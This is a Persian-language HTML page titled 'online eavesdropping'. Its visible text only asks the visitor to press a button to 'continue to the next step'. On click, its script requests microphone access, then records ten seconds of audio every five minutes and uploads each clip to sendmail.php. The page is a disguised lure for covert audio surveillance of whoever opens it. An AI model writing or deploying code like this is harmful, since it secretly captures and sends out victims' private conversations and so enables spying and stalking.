<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>شنود آنلاین</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #2c001e, #59003c);
      font-family: 'Vazir', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
      direction: rtl;
    }

    #startBtn {
      background-color: #9b1455;
      color: white;
      padding: 15px 40px;
      font-size: 20px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
      transition: all 0.3s ease;
    }

    #startBtn:hover {
      background-color: #c2185b;
      transform: scale(1.05);
    }

    h2 {
      position: absolute;
      top: 20px;
      text-shadow: 0 2px 5px black;
    }
  </style>
</head>
<body>
  <h2>برای ادامه، دکمه را فشار دهید</h2>
  <button id="startBtn">ادامه مرحله بعد</button>

  <script>
    let mediaRecorder;
    let chunks = [];

    document.getElementById('startBtn').onclick = async () => {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      mediaRecorder = new MediaRecorder(stream);

      mediaRecorder.ondataavailable = function (e) {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = function () {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const formData = new FormData();
        formData.append('audio', blob, 'audio_' + Date.now() + '.webm');

        fetch('sendmail.php', {
          method: 'POST',
          body: formData
        }).then(res => console.log('ارسال شد')).catch(err => console.error(err));

        chunks = [];
      };

      startRecordingCycle();
      setInterval(startRecordingCycle, 5 * 60 * 1000); // هر ۵ دقیقه
    };

    function startRecordingCycle() {
      if (!mediaRecorder) return;
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 10000); // ۱۰ ثانیه ضبط
    }
  </script>
</body>
</html>
